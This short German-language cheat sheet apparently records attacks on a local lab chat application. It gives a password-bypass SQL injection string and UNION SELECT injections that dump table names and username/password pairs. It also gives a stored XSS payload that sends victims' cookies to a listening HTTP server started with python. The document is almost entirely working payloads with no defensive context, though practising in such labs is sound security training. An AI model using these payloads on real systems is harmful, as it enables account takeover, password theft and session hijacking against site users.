# SQL Injection

## SQL Injection für login ohne passwort
`' or '1' = '1`

## SQL Injections im get parameter 'chat' 
http://localhost:5000/?chat=

### Leaken der Datenbanktabellen:
`0) union select 1,1,1,table_name from information_schema.tables;--`

### Leaken der passwörter:
`0) union select 1,1,1,CONCAT(username, " ", password) from chatusers;--`


# XSS
Http Server starten wo Cookie empfangen wird:
`python -m http.server`
XSS in den Status eines Users kopiern:
`<script>document.write(\'<img src=\\\'http://localhost:8000?n=\'+document.cookie+\'\\\'/>\')</script>`